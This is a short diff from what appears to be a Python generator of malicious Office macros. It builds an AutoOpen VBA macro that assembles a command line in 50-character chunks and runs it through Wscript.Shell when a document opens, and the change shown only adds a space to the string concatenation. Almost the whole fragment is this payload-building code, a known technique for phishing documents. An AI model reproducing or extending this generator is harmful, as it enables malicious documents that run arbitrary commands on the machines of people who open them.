@@ -31,7 +31,7 @@ Sub AutoOpenMacro()
 """
 
 for i in range(0, len(cmdline), 50):
-  macro_payload = macro_payload + "        Str = Str +" + '"' + cmdline[i:i + 50] + '"\n'
+  macro_payload = macro_payload + "        Str = Str + " + '"' + cmdline[i:i + 50] + '"\n'
 
 macro_payload = macro_payload + """
 	CreateObject("Wscript.Shell").Run Str
